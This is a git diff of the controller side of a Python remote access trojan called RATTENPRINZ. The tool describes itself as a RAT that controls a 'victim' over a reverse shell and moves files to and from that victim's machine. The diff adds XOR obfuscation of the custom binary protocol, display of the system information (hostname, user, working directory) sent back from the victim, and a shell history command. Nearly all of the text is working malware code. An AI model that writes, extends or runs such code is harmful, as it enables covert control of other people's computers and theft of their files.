@@ -12,7 +12,7 @@ import hashlib
 HEADER_FORMAT = '!B I'  # B = MTYPE (1 byte); I = PAYLOAD LENGTH (4 bytes)
 HEADER_SIZE = struct.calcsize(HEADER_FORMAT) 
 LHOST = '127.0.0.1'
-KEY = 'placeholder'
+XOR_KEY = 'R@TT3NPR1NZ'
 
 # PROTOCOL MESSAGE TYPES
 MT_BEACON 	= 0
@@ -28,8 +28,19 @@ MT_ERR		= 7
 # HELPER FUNCTIONS
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(prog='RATTENPRINZ', description='RAT with full command line functionality and easy file uploads/downloads', epilog='MADE BY FR05TBYTEX')
-    #parser.add_argument('RHOST', help='victim IP address')
+    parser = argparse.ArgumentParser(prog='RATTENPRINZ', 
+        description='+++ RATTENPRINZ +++\n\nLIGHTWEIGHT RAT WITH BASIC CMDLINE FUNCTIONALITY AND EASY FILE UPLOADS/DOWNLOADS; USES CUSTOM BINARY PROTOCOL WITH XOR CIPHER',
+        epilog='''\nSHELL COMMANDS:
+    UPLOAD <LOCAL_FILEPATH>     UPLOAD A FILE FROM C2 -> VICTIM
+    DOWNLOAD <REMOTE_FILEPATH)  DOWNLOAD A FILE FROM VICTIM -> C2
+    LHISTORY                    SHOW SHELL HISTORY
+    EXIT or QUIT                EXIT SESSION
+
+NB. IF SHELL HANGS PRESS CTRL+C FOR AUTO-RECONNECT; PRESSING CTRL+C TWICE WILL EXIT RATTENPRINZ SHELL ENTIRELY
+
++++ MADE BY FR05TBYTEX +++''',
+        formatter_class=argparse.RawDescriptionHelpFormatter
+        )
     parser.add_argument('-p', '--port', type=int, default=1346, help='port to listen on (default=1346)')
     parser.add_argument('-v', '--verbose', help='verbose/debug mode', action='store_true')
     return parser.parse_args()
@@ -37,6 +48,21 @@ def parse_arguments():
 def vprint(*args):
     if getattr(c2_args, 'verbose', True):
         print(*args)
+
+def xor_crypt(payload: bytes, key: str = XOR_KEY) -> bytes:        # SYMMETRIC REPEATING KEY XOR FUNCTION - NB. THIS ONLY OBFUSCATES PAYLOAD
+
+    if not payload:                         # IF NO PAYLOAD THEN RETURN EMPTY BYTES OBJECT
+        return b''
+
+    if isinstance(payload, bytearray):      # NORMALIZE INPUT - BYTEARRAY -> BYTES
+        payload = bytes(payload)
+    elif not isinstance(payload, bytes):
+        raise TypeError("--- XOR_CRYPT ERROR: PAYLOAD MUST BE IN BYTES/BYTEARRAY ---")
+
+    key_bytes = key.encode('utf-8', errors='strict')
+    key_len = len(key_bytes)
+
+    return bytes(b ^ key_bytes[i % key_len] for i, b in enumerate(payload)) # APPLY REPEATING XOR CIPHER - NB. FAIRLY TRIVIAL TO BREAK CIPHER
 
 def recv_packet(s):
     header = bytearray()                                                              # RECEIVE HEADER
@@ -57,12 +83,14 @@ def recv_packet(s):
     else:
         payload = b''
     
-    return mtype, payload_length, payload                                             # RETURN MTYPE, PAYLOAD_LENGTH, PAYLOAD
+    decrypted_payload = xor_crypt(payload)
+    return mtype, payload_length, decrypted_payload                                             # RETURN MTYPE, PAYLOAD_LENGTH, PAYLOAD
 
 def send_data(s, mtype: int, payload: bytes) -> bool:
     try: 
-        header = struct.pack(HEADER_FORMAT, mtype, len(payload))
-        s.sendall(header + payload)
+        enc_payload = xor_crypt(payload)
+        header = struct.pack(HEADER_FORMAT, mtype, len(enc_payload))
+        s.sendall(header + enc_payload)
         return True
     except Exception as e:
         print(e)
@@ -83,7 +111,7 @@ def init(args):
             vprint(f'received beacon packet: {response}')
 
             if response[0] != MT_BEACON:                # DROPS CONNECTION IF WRONG INTIIAL MTYPE != BEACON PING
-                print('--- unexpected mtype... dropping connection ---')
+                print('--- UNEXPECTED MTYPE... DROPPING CONNECTION ---')
                 conn.close()    # CLOSE REMOTE CONNECTION
                 sys.exit(1)     # EXIT WITH ERROR CODE 1      
 
@@ -93,10 +121,15 @@ def init(args):
                 vprint('sent packet to revshell with MT_AUTH flag')
                 
                 response = recv_packet(conn)            # GRABS RESPONSE FROM REVSHELL
-                vprint(f'received packet: {response}')
+                vprint(f'RECEIVED PACKET: {response[0]}, {response[1]}, AND LOCAL SYSINFO AS PAYLOAD (SEE BELOW)')
                 if response[0] == MT_AUTH:              # CHECKS IF REVSHELL SENDS AUTH OK 
                     vprint(f'auth acknowledged -> MTYPE MT_AUTH MATCH 1: {response[0]}')
                     print('+++ INIT COMPLETE +++')
+                    if c2_args.verbose:
+                        vprint(f'=== FULL SYSTEM INFO ===\n: {response[2].decode('utf-8', errors='replace')}\n' + '===' * 25)
+                    else:
+                        basic_sysinfo = response[2].decode('utf-8', errors='replace').strip().split('\n')
+                        print(f'=== SYSTEM INFO ===\nHOSTNAME: {basic_sysinfo[0]}\nUSER: {basic_sysinfo[1]}\nUPTIME: {basic_sysinfo[2]}\nCURRENT WORKING DIRECTORY: {basic_sysinfo[3]}\n' + '===' * 25)
                     return conn                         # IF AUTH OK THEN RETURNS REVSHELL SOCKET
                 print('--- AUTH HANDSHAKE FAILED ---')
 
@@ -217,17 +250,19 @@ def download_file(s, remote_filepath: str) -> bool:
 # MAIN FUNCTION
 def main():
 
-    global c2_args                  # SET c2_args as GLOBAL VAR
+    global c2_args                  # SET c2_args AS GLOBAL VAR
     c2_args = parse_arguments()     # POPULATE c2_args
 
     while True:
         s = None
         try:
-            s = init(c2_args)
-
+            s = init(c2_args)       # INIT SOCKET
+            history = []            # INIT LOCAL HISTORY LIST
             while True:
                 try:
                     cmd = input('$ ').strip()
+                    if cmd.strip():
+                        history.append(cmd)
 
                     if cmd.lower() in ['exit', 'quit']:
                         print('--- C2 USER QUIT; SHUTTING DOWN... ---')
@@ -259,6 +294,12 @@ def main():
                         else:
                             print(f'ERROR: UNKNOWN MSG TYPE')
                             vprint(f'packet: {response}')
+
+                    if cmd.lower() == 'lhistory':
+                        print('\nRATTENPRINZ SHELL COMMAND HISTORY')
+                        for i, command in enumerate(history, 1):
+                            print(f'{i}  {command}')
+                        continue
 
                 except KeyboardInterrupt:
                     print('--- C2 USER PRESSED CTRL+C')
